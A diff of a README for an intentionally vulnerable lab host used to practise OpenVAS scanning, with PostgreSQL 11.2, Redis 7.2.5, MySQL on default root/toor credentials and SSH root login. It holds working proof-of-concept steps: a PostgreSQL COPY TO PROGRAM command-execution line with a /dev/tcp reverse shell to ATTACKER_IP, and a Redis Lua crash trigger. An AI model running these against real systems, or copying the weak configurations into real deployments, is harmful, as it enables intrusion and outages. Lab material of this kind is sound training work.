@@ -2,7 +2,7 @@
 
 > ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**
 
-Deploy target: **192.168.10.101**. The compose file publishes every port on `0.0.0.0`, so no IP edit is required.
+Deploy target: **192.168.10.101** (lab example; live host may differ, e.g. `192.168.80.37`). MySQL and SSH run on the **host**. PostgreSQL and Redis stay in Docker with **`network_mode: host`** so they share the host’s routes (reach other lab machines) and expose version banners on host **`:5432`** / **`:6379`** for OpenVAS.
 
 Services OpenVAS can match on this host:
 
@@ -10,14 +10,15 @@ Services OpenVAS can match on this host:
 | --- | --- | --- | --- |
 | CVE-2019-9193 | PostgreSQL | 5432 | **11.2** (range 9.3–11.2) |
 | CVE-2024-31449 | Redis | 6379 | **7.2.5** (range 7.2.0–7.2.5) |
+| CVE-1999-0502 | MySQL | 3306 | Default creds (`root` / `toor`) — add custom OpenVAS login if feed list lacks `toor` |
 
-MySQL and SSH are the Ubuntu image. PostgreSQL and Redis are separate pinned images. Copy `.env.example` to `.env` and set the passwords there before `docker compose up`. SSH is published on host port **2222**.
+PostgreSQL and Redis use pinned images. Copy `.env.example` to `.env` and set Postgres passwords before `docker compose up`. Host SSH is on port **22** (root login allowed). Inner container SSH (`2222`) is not used.
 
 ---
 
-## Deploy on 192.168.10.101
+## Deploy on the lab host
 
-Copy `machines/rz-db01` to the host as `/opt/rz-db01`. The lab hosts so far are Ubuntu 24.04. Install Docker with `sudo`, then start the stack.
+Copy `machines/rz-db01` to the host (e.g. `/opt/rz-db01` or `/home/debian/rz-db01`). Lab hosts so far are Ubuntu 24.04. Install Docker with `sudo`, then start **Postgres + Redis** from compose. Install/configure **MySQL on the host** separately (`root` / `toor`, `bind-address = 0.0.0.0`, `skip_ssl` if Kali MariaDB clients fail TLS).
 
 ```bash
 sudo apt-get update
@@ -32,12 +33,12 @@ sudo systemctl enable --now docker
 
 cd /opt/rz-db01
 cp .env.example .env
-# edit .env, then:
-sudo docker compose up -d --build
+# edit .env (POSTGRES_*), then start only postgres + redis if MySQL is on the host:
+sudo docker compose up -d --force-recreate postgres redis
 sudo docker compose ps
 ```
 
-If an older PostgreSQL container is already bound to port 5432, remove it before the compose start. Ubuntu’s own PostgreSQL 16 package will not match CVE-2019-9193.
+Postgres/Redis use **host networking** (no `ports:` mapping). They bind directly on the host. If something else already owns 5432/6379, stop it first. Ubuntu’s own PostgreSQL 16 / redis-server ~7.0.15 will **not** match the CVEs — keep the pinned Docker images (**11.2** / **7.2.5**).
 
 ## Verify
 
@@ -45,9 +46,10 @@ If an older PostgreSQL container is already bound to port 5432, remove it before
 sudo docker inspect -f '{{.State.Health.Status}}' vulncorp-postgres vulncorp-redis
 sudo docker exec vulncorp-postgres psql -U vulncorp_user -d vulncorp_prod -c 'select version();'
 sudo docker exec vulncorp-redis redis-cli INFO server | head
+mysql -h 127.0.0.1 -u root -ptoor -e "SELECT VERSION();"
 ```
 
-Expected banners: PostgreSQL **11.2** and `redis_version:7.2.5`. Scan **192.168.10.101** ports **5432** and **6379** with OpenVAS **Full and fast** and an updated Community feed.
+Expected banners: PostgreSQL **11.2**, `redis_version:7.2.5`, MySQL **8.0.x**. Scan the host ports **3306**, **5432**, and **6379** with OpenVAS **Full and fast** and an updated Community feed (include 6379 explicitly; top-1000 can skip it).
 
 ---
 
@@ -55,35 +57,93 @@ Expected banners: PostgreSQL **11.2** and `redis_version:7.2.5`. Scan **192.168.
 
 | Service | Port | Vulnerability |
 |---------|------|---------------|
-| **MySQL** | `3306` | Default root credentials (`root` / `toor`), bound to `0.0.0.0`, PII stored in plaintext |
-| **PostgreSQL** | `5432` | Upstream **11.2**, superuser `vulncorp_user` / `vulncorp123`. Last build in the CVE-2019-9193 range OpenVAS matches (9.3 through 11.2) |
-| **Redis** | `6379` | Upstream **7.2.5** (no password, `protected-mode no`). In the CVE-2024-31449 range OpenVAS matches (fixed in 7.2.6) |
-| **SSH** | `22` | OpenSSH root login allowed |
+| **MySQL** (host) | `3306` | Default root credentials (`root` / `toor`), bound to `0.0.0.0` |
+| **PostgreSQL** (Docker) | `5432` | Upstream **11.2**, superuser `vulncorp_user` / `vulncorp123`. Last build in the CVE-2019-9193 range OpenVAS matches (9.3 through 11.2) |
+| **Redis** (Docker) | `6379` | Upstream **7.2.5** (no password, `protected-mode no`). In the CVE-2024-31449 range OpenVAS matches (fixed in 7.2.6) |
+| **SSH** (host) | `22` | OpenSSH root login allowed |
 
 ---
 
-## 🔍 Attack Vectors & Exploitation Guide
+## 🔌 Connect & lab checks
 
-### 1. MySQL Data Exfiltration
+Replace `TARGET` with the host IP (e.g. `192.168.80.37` or `192.168.10.101`).
+
+### 1. MySQL — default credentials
+
+Kali often uses MariaDB client (`--ssl=0` if TLS errors):
+
 ```bash
-mysql -h 172.16.0.10 -u root -ptoor
+mysql -h TARGET -u root -ptoor --ssl=0 -e "SELECT VERSION(), USER();"
+```
+
+Interactive:
+
+```bash
+mysql -h TARGET -u root -ptoor --ssl=0
 SHOW DATABASES;
-USE vulncorp_prod;
-SELECT * FROM employees;               # SSNs, salaries, emails
-SELECT * FROM internal_credentials;    # Passwords for DC, ERP, DevOps, Backup
+SELECT VERSION();
 ```
 
-### 2. PostgreSQL RCE (COPY TO PROGRAM)
+### 2. PostgreSQL — CVE-2019-9193 (`COPY … PROGRAM`)
+
+Connect (superuser `vulncorp_user` — required for `COPY PROGRAM`):
+
 ```bash
-psql -h 172.16.0.10 -U vulncorp_user -d vulncorp_prod
+psql -h TARGET -U vulncorp_user -d vulncorp_prod
 # Password: vulncorp123
-# Execute reverse shell:
-COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1';
 ```
 
-### 3. Redis CVE-2024-31449
+Confirm version / superuser:
 
-The Redis service is `vulncorp-redis` (`redis:7.2.5`) on **192.168.10.101:6379**. `requirepass` is empty and `protected-mode` is off. OpenVAS matches this banner in the 7.2.0–7.2.5 range (fixed in 7.2.6). CVE-2024-31449 is an authenticated Lua bug, not a crontab write. A default top-1000 port scan can skip 6379, so include that port in the scan.
+```sql
+SELECT version();
+SELECT rolname, rolsuper FROM pg_roles WHERE rolname = current_user;
+```
+
+Lab PoC (runs OS command as the postgres OS user; lab only):
+
+```sql
+COPY (SELECT '') TO PROGRAM 'id';
+-- reverse shell example (set ATTACKER_IP / port first):
+-- COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1';
+```
+
+Safe no-op check that `COPY PROGRAM` is allowed:
+
+```sql
+COPY (SELECT 1) TO PROGRAM 'true';
+```
+
+### 3. Redis — CVE-2024-31449
+
+Connect (no password):
+
+```bash
+redis-cli -h TARGET
+```
+
+Or one-shot:
+
+```bash
+redis-cli -h TARGET PING
+redis-cli -h TARGET INFO server | grep redis_version
+```
+
+Expect `PONG` and `redis_version:7.2.5`.
+
+After connect, CVE-2024-31449 Lua trigger (may **crash** vulnerable Redis — lab only):
+
+```text
+EVAL "return bit.tohex(65535, -2147483648)" 0
+```
+
+One-liner from the shell:
+
+```bash
+redis-cli -h TARGET EVAL "return bit.tohex(65535, -2147483648)" 0
+```
+
+OpenVAS matches the **7.2.5** banner in the 7.2.0–7.2.5 range (fixed in 7.2.6). This CVE is an authenticated Lua/`bit.tohex` issue when auth is required; this lab leaves Redis **unauthenticated**, so the same EVAL works after a plain connect. Include port **6379** in the scan.
 
 ---
 
